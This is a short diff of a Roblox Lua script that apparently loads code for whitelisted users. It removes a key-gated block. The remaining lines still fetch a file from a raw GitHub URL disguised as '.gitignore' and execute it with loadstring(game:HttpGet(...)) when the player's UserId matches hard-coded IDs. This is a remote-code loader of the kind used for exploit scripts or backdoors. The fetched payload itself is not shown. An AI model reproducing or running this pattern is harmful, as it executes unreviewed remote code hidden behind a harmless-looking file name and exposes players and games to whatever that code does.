@@ -1,9 +1,5 @@
 local whitelister = game.Players.LocalPlayer.UserId
-spawn (function()
-if Key == "12de" then
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Skrapisismyscript/no-bruh/main/.gitignore')))()
-end
-end)
+
 spawn (function()
 if whitelister == 2937813035 or whitelister == 675333450 then
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Skrapisismyscript/no-bruh/main/.gitignore')))()
